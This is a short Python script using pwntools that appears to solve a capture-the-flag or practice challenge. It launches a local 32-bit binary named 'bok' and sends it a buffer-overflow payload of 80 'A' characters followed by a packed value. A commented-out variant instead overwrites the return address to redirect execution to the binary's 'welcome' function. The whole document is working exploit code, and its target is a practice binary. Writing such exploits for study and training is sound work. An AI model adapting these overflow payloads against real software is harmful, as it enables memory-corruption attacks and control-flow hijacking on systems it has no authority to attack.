from pwn import *
context(arch='i386',os='linux',log_level="debug")

p = process('./bok')
e = ELF("./bok")
welcome = e.symbols['welcome']
print(welcome)
#gdb.attach(p,"b *0x56555666")
payload ='A' * 80 + p32(0x00000054) 
#payload ='A' * 92 + "B" * 4 + p16(welcome)
print(payload)
p.sendline(payload)
print(p.recvall())




